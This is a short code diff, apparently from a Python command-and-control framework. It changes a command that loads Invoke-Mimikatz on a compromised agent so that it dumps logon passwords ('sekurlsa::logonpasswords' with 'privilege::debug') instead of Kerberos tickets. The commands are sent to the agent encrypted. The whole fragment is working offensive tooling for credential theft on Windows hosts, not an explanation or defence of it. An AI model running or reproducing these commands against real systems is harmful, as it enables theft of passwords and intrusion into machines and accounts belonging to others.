@@ -340,7 +340,7 @@ class cmd:
             print "you can't use this command in main ! chose an agent"
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"privilege::debug" "SEKURLSA::Tickets"'"""))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'"""))
 
     def screenshot(self, args=None):
         if config.get_pointer()=='main':
